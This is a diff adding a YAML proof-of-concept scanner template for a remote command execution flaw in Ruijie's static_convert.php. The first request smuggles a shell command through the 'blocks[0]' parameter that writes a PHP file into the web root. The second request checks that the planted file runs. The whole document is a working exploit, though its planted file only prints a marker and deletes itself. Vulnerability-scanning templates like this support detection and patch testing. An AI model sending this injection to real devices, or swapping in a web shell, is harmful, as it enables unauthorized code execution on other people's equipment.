@@ -1,0 +1,26 @@
+name: poc-yaml-ruijie-static_convert-RCE
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20print("Superhero")%3bunlink(__FILE__)%3b?>%27%20>/var/www/html/test.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    expression: response.status == 200 
+  r1:
+    request:
+      method: GET
+      path: /test.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'Superhero')
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139883855
